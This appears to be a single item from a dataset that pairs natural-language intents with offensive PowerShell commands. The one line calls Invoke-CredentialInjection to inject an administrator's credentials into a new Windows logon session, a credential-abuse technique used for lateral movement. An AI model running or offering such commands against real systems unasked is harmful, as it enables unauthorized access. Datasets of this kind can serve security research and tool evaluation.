# Natural language intent:
# Perform credential injection and create a new Windows logon session

Invoke-CredentialInjection -DomainName 'demo' -UserName 'administrator' -Password 'Password1' -NewWinLogon
